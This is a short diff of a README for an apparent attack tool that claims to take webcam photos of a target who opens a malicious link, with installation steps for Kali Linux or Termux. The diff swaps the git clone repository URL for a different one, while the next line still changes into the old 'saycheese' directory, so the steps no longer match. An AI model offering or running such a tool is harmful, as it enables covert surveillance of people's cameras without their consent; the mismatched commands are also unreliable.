@@ -14,7 +14,7 @@ Take webcam shots from target just sending a malicious link
 ## Installing (Kali Linux/Termux):
 
 ```
-git clone https://github.com/Anonymous3-SIT/saycheese
+git clone https://github.com/DepthSath/CameraHack
 cd saycheese
 bash saycheese.sh
 ```
